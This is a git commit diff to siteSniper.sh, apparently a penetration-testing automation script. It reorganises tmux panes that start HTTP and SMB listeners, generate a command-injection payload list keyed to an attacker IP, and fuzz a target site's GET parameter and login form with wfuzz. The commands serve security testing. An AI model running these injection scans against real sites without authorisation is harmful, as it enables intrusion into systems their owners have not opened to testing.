96a97fddb49d30a0d5ce422b13cdeb69e2f6df1e
luigi.capuzzello <luigi.capuzzello@gmail.com>
2024-03-13 23:18:32 +0100

    modified command injection tool to eliminate a duplicate row in tmux session

--- siteSniper.sh
+++ siteSniper.sh
@@ -961,14 +961,12 @@ tmux new-window -t PT:3 -n 'WEB Command Injection'
 tmux split-window -v -t PT:3.0
 tmux split-window -v -t PT:3.1
 tmux split-window -v -t PT:3.2
-tmux split-window -v -t PT:3.3
 tmux select-pane -t "3.1"
 tmux split-window -h -t "3.1"
 tmux split-window -h -t "3.1"
 tmux select-pane -t "3.4"
 tmux split-window -h -t "3.4"
-tmux select-pane -t "3.6"
-tmux split-window -h -t "3.6"
+
 
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:3.0 "# automate command injection scan" Enter
@@ -979,20 +977,16 @@ tmux send-keys -t PT:3.2 "# activate listener HTTP" Enter
 tmux send-keys -t PT:3.2 "python3 -m http.server 80"
 tmux send-keys -t PT:3.3 "# activate listener SMB" Enter
 tmux send-keys -t PT:3.3 "impacket-smbserver -smb2support htb \$(pwd)"
-tmux send-keys -t PT:3.4 "# verify blocked chars (GET)" Enter
-tmux send-keys -t PT:3.4 "wfuzz -w /opt/SecLists/Fuzzing/special-chars.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
-tmux send-keys -t PT:3.5 "# verify blocked chars (POST)" Enter
-tmux send-keys -t PT:3.5 "wfuzz -w /opt/SecLists/Fuzzing/special-chars.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php"
 #Preparo il file per le command injection
 cd $folderProjectEngine
 #tmux send-keys -t PT:3.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
 python ./cmdGenerator.py $attackerIP cmdlist.txt
 mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
 cd $folderProjectWebAuthN
-tmux send-keys -t PT:3.6 "# command injection automation (GET)" Enter
-tmux send-keys -t PT:3.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
-tmux send-keys -t PT:3.7 "# command injection automation (POST)" Enter
-tmux send-keys -t PT:3.7 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php # cmd injection (POST)"
+tmux send-keys -t PT:3.4"# command injection automation (GET)" Enter
+tmux send-keys -t PT:3.4 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
+tmux send-keys -t PT:3.5 "# command injection automation (POST)" Enter
+tmux send-keys -t PT:3.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php # cmd injection (POST)"
 cd $folderProject
 
 
